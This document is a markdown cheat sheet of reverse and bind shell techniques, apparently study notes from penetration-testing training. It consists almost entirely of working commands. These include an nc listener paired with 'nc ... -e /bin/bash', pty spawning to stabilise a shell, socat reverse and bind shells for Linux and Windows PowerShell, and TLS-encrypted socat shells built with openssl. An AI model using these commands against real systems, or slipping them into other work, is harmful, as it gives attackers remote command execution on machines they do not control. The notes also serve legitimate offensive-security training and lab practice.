#### TYPES OF SHELLS
  
  Reverse shell - server sends you a shell and offers you a /bin/bash of sorts to run your commands  
  Bind shell - server opens up a port and offers you a bash to run your input against that
  
###### BASIC REVERSE/BIND SHELLS

`sudo nc -lvnp 443` - On the attacking machine  
`nc <LOCAL-IP> <PORT> -e /bin/bash` - On the target

###### STABILIZING NC SHELL

1. `python -c 'import pty;pty.spawn("/bin/bash")'`
2. `export TERM=xterm`
3. background your reverse shell using Ctrl+Z
4. `stty raw -echo; fg` - bring back foreground

###### HOW TO USE VI / NANO ON REVERSE SHELL

1. run `stty -a` on your attacker machine - you will get some op that gives you numbers for rows and columns, say `rows 45; columns 115;`
2. in your shell, type `stty rows <number>`, `stty cols <number>`

###### SOCAT BASIC SHELLS

The easiest way to think about socat is as a connector between two points - MuirlandOracle

reverse shells

1. On attacker machine - `socat TCP-L:<port> -`
2. On Linux target - `socat TCP:<ATTACKER-IP>:<ATTACKER-PORT> EXEC:"bash -li"`
3. On Windows target - `socat TCP:<ATTACKER-IP>:<ATTACKER-PORT> EXEC:powershell.exe,pipes`

bind shells

1. on attacker machine - `socat TCP:<TARGET-IP>:<TARGET-PORT> -`
2. on linux target - `socat TCP-L:<PORT> EXEC:"bash -li"`
3. on windows target - `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

socat linux only very stable tty shell -
on linux attacker machine - ```socat TCP-L:<port> FILE:`tty`,raw,echo=0```  
on linux target machine - `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

###### SOCAT ENCRYPTED SHELLS

1. create a cert and key on attacker machine - `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
2. We then need to merge the two created files into a single `.pem` file - `cat shell.key shell.crt > shell.pem`

reverse shell listener - `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`  
on target machine - `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

if we want to do for a bind shell, just use the same listener command on target machine, and attach cmd.exe / bash to it

for eg: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -` - 
remove this dash at the end (which previously connects listener and stdin) and place `EXEC:/bin/bash` (which connects listener and cmd.exe)  

socat very stable tty openssl listener  
on linux attacker machine - ```socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0```  
on linux target machine - ```socat OPENSSL:<attacker-ip>:<attacker-port>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane```  

